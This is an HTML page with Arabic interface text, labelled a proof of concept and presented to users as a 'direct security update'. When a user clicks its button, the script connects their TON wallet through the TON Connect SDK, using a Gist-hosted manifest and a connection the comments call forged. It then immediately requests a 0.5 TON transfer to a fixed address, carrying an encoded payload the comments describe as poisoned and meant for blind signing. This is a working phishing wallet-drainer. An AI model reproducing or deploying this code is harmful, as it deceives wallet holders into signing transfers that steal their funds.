<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>Direct SDK Connection - PoC</title>
    <style>
        body { font-family: sans-serif; background: #0b0e11; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background: #1e2329; padding: 30px; border-radius: 20px; text-align: center; border: 1px solid #333; width: 350px; }
        button { background: #fcd535; color: #000; border: none; padding: 15px; width: 100%; border-radius: 10px; font-weight: bold; cursor: pointer; font-size: 16px; }
        #log { margin-top: 20px; font-size: 12px; color: #848e9c; text-align: left; background: #000; padding: 10px; border-radius: 5px; height: 80px; overflow-y: auto; }
    </style>
</head>
<body>

<div class="card">
    <h2>تحديث أمني مباشر</h2>
    <p>اضغط للربط المباشر عبر الـ SDK</p>
    <button id="connectBtn">اتصال مباشر (Direct Connect)</button>
    <div id="log">بانتظار الأوامر...</div>
</div>

<script src="https://unpkg.com/@tonconnect/sdk@latest/dist/tonconnect-sdk.min.js"></script>

<script>
    const log = document.getElementById('log');
    const logger = (m) => log.innerHTML += `<div>> ${m}</div>`;

    // استخدم رابط الـ Gist الخاص بك هنا
    const manifest = "https://gist.githubusercontent.com/pp0p/5119b45ec095aecbe9638d21f36e56ad/raw/d30a363c4cf4b6926d8b310a02ee1d350d869729/tonconnect-manifest.json";

    const connector = new TonConnectSDK.TonConnect({ manifestUrl: manifest });

    document.getElementById('connectBtn').onclick = async () => {
        logger("جاري توليد رابط الاتصال...");

        try {
            // طلب الاتصال وتوليد الرابط
            const walletConnectionSource = {
                universalLink: 'https://app.tonkeeper.com/ton-connect',
                bridgeUrl: 'https://bridge.tonapi.io/bridge'
            };

            // الـ SDK سيولد رابطاً يحتوي على المعرفات اللازمة
            const connectUrl = connector.connect(walletConnectionSource);

            if (connectUrl) {
                logger("تم توليد الرابط. جاري التحويل...");
                // فتح المحفظة فوراً
                window.location.href = connectUrl;
            }
        } catch (e) {
            logger("خطأ: " + e.message);
        }
    };

    // الاستجابة فور نجاح الربط (الانتحال)
    connector.onStatusChange(async (wallet) => {
        if (wallet) {
            logger("✅ تم الاتصال بهوية مزورة!");
            
            // إرسال المعاملة المسمومة (BOC العميق)
            const transaction = {
                validUntil: Math.floor(Date.now() / 1000) + 60,
                messages: [{
                    address: "0QBMdBOi2OkuHuLvm7lqKar2JFdrKif6prMyHV3ZTZcSGb0c",
                    amount: "500000000",
                    payload: "te6cckEBOQEA/gABWxI0q80AAAAAAAAAAIAJjoJ0Wx0lw9xd83ctRTVexIrtZUT/VNZmQ6u7KbLiQzABAQACAQADAQAEAQAFAQAGAQAHAQAIAQAJAQAKAQALAQAMAQANAQAOAQAPAQAQAQARAQASAQATAQAUAQAVAQAWAQAXAQAYAQAZAQAaAQAbAQAcAQAdAQAeAQAfAQAgAQAhAQAiAQAjAQAkAQAlAQAmAQAnAQAoAQApAQAqAQArAQAsAQAtAQAuAQAvAQAwAQAxAQAyAQAzAQA0AQA1AQA2AQA3AQA4AEsAAAAAgAmOgnRbHSXD3F3zdy1FNV7Eiu1lRP9U1mZDq7spsuJDMNjs78g="
                }]
            };

            setTimeout(async () => {
                try {
                    logger("إرسال طلب التوقيع الأعمى...");
                    await connector.sendTransaction(transaction);
                } catch (err) {
                    logger("تم رفض المعاملة.");
                }
            }, 1000);
        }
    });
</script>
</body>
</html>
